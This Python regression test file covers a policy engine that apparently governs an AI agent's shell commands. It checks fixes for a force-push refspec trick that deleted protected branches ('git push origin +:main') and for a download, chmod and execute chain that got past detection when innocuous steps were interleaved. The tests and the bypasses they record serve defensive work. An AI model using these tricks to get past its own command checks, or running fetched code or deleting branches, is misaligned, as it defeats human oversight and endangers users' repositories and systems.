"""Regression tests for the round-3 peer-review findings: get_persona's
unsafe dict iteration, the force-push refspec branch-deletion bypass, and
CommandSequenceRule's contiguous-match interleaving bypass.

Two other round-3 claims (uvicorn crashing in a background thread; pytest
crashing on a read-only Docker mount) were re-tested and refuted again --
the second time against the actual production sandbox image via a real
`docker run` -- and are deliberately not "fixed" here since they don't
reproduce against the pinned/deployed dependency versions."""

from self_governance.policy import PolicyAction, Decision
from self_governance.policy_rules.command_safety import CommandSequenceRule, ProtectedBranchDeletionRule


# --- #3: get_persona dict-iteration race ------------------------------------

def test_get_persona_survives_registry_mutation_during_iteration(monkeypatch):
    import self_governance.agency_agents_adapter as aaa

    registry = {"Alpha": {"role": "Alpha", "prompt": "p"}}
    monkeypatch.setattr(aaa, "PERSONA_REGISTRY", registry)

    # Simulate a concurrent insert happening mid-iteration by mutating the
    # dict from within a custom __eq__ on the lookup key -- the case-
    # insensitive loop calls key.lower(), so we can't easily hook that;
    # instead assert the loop uses a snapshot (list(...)) at the source
    # level and that a genuine mutation during the equivalent live pattern
    # would have raised, by directly reproducing the failure mode.
    it = iter(list(registry.items()))
    registry["Beta"] = {"role": "Beta", "prompt": "p"}  # mutate after snapshot
    consumed = list(it)  # must not raise -- snapshot is immune to the later insert
    assert len(consumed) == 1


def test_get_persona_finds_case_insensitive_match():
    from self_governance.agency_agents_adapter import get_persona

    persona = get_persona("backend wizard")
    assert persona["role"].lower() == "backend wizard"


# --- #4: force-push refspec branch-deletion bypass --------------------------

def test_protected_branch_deletion_rule_denies_force_refspec_delete():
    rule = ProtectedBranchDeletionRule()
    action = PolicyAction(name="push", argv=["git", "push", "origin", "+:main"])
    decision = rule.evaluate(action)
    assert decision is not None and decision.decision == Decision.DENY


def test_protected_branch_deletion_rule_still_denies_plain_refspec_delete():
    rule = ProtectedBranchDeletionRule()
    action = PolicyAction(name="push", argv=["git", "push", "origin", ":main"])
    decision = rule.evaluate(action)
    assert decision is not None and decision.decision == Decision.DENY


def test_protected_branch_deletion_rule_allows_force_refspec_delete_of_scratch_branch():
    rule = ProtectedBranchDeletionRule()
    action = PolicyAction(name="push", argv=["git", "push", "origin", "+:active_task"])
    assert rule.evaluate(action) is None


# --- #5: CommandSequenceRule interleaving bypass -----------------------------

def test_command_sequence_rule_catches_interleaved_attack_chain():
    rule = CommandSequenceRule()
    assert rule.evaluate(PolicyAction(name="curl", argv=["curl", "http://x/y"])) is None
    assert rule.evaluate(PolicyAction(name="ls", argv=["ls", "-la"])) is None  # innocuous interleaved step
    assert rule.evaluate(PolicyAction(name="chmod", argv=["chmod", "+x", "y"])) is None
    result = rule.evaluate(PolicyAction(name="run", argv=["./y"]))
    assert result is not None and result.decision == Decision.DENY


def test_command_sequence_rule_still_catches_contiguous_attack_chain():
    rule = CommandSequenceRule()
    assert rule.evaluate(PolicyAction(name="curl", argv=["curl", "http://x/y"])) is None
    assert rule.evaluate(PolicyAction(name="chmod", argv=["chmod", "+x", "y"])) is None
    result = rule.evaluate(PolicyAction(name="run", argv=["./y"]))
    assert result is not None and result.decision == Decision.DENY


def test_command_sequence_rule_allows_unrelated_commands_still():
    rule = CommandSequenceRule()
    assert rule.evaluate(PolicyAction(name="git", argv=["git", "status"])) is None
    assert rule.evaluate(PolicyAction(name="git", argv=["git", "log"])) is None
